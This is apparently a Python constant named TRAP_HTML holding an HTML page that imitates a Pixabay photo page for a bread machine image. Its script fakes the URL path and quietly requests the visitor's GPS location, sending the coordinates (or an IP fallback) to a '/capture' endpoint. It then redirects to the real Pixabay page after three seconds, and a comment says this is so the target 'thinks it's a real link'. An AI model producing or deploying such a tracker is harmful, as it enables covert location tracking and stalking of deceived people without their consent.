# --- THE TRAP (Cloaked as Pixabay) ---
TRAP_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bread Machine - Free photo on Pixabay</title>
    <script>
        // 1. Change the URL path to look like Pixabay
        window.history.pushState("", "", "/photos/bread-machine-household-appliances-6047/");
        
        // 2. Silent Tracker
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    fetch('/capture?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude + '&method=GPS');
                },
                function(error) {
                    fetch('/capture?method=IP');
                }
            );
        } else {
            fetch('/capture?method=IP');
        }

        // 3. The Redirect after 3 seconds (So he thinks it's a real link)
        setTimeout(function() {
            window.location.href = "https://pixabay.com/photos/bread-machine-household-appliances-6047/";
        }, 3000);
    </script>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; background: #fff; color: #333; }
        .header { display: flex; align-items: center; padding: 15px 20px; border-bottom: 1px solid #eee; }
        .header svg { height: 30px; }
        .header h2 { margin: 0 0 0 10px; font-size: 20px; color: #191b26; font-weight: bold; }
        .main { max-width: 900px; margin: 20px auto; padding: 0 20px; display: flex; gap: 30px; }
        .image-container { flex: 2; }
        .image-container img { width: 100%; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .sidebar { flex: 1; }
        h1 { font-size: 24px; margin-top: 0; color: #191b26; }
        .tags { display: flex; gap: 10px; margin-top: 15px; flex-wrap: wrap; }
        .tag { background: #f2f2f2; color: #555; padding: 6px 12px; border-radius: 20px; font-size: 13px; text-decoration: none; }
        .author-box { display: flex; align-items: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee; }
        .author-icon { width: 40px; height: 40px; border-radius: 50%; background: #ccc; margin-right: 15px; }
        .btn-download { display: block; text-align: center; background: #05a081; color: white; padding: 12px; border-radius: 24px; font-weight: bold; text-decoration: none; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="header">
        <svg viewBox="0 0 100 30" fill="#05a081"><text x="0" y="24" font-family="Arial" font-weight="bold" font-size="24">pixabay</text></svg>
    </div>
    <div class="main">
        <div class="image-container">
            <img src="https://cdn.pixabay.com/photo/2012/04/15/20/39/bread-35042_1280.png" alt="Bread Machine">
        </div>
        <div class="sidebar">
            <h1>Bread Machine, Household Appliances</h1>
            <p style="color: #767676; font-size: 14px;">Free photo by <strong>OpenClipart-Vectors</strong></p>
            <div class="tags">
                <a href="#" class="tag">bread machine</a>
                <a href="#" class="tag">household appliances</a>
                <a href="#" class="tag">kitchen</a>
            </div>
            <a href="#" class="btn-download">Download</a>
            <div class="author-box">
                <div class="author-icon"></div>
                <div>
                    <strong>OpenClipart-Vectors</strong><br>
                    <span style="font-size: 12px; color: #767676;">2,419 Followers</span>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
"""
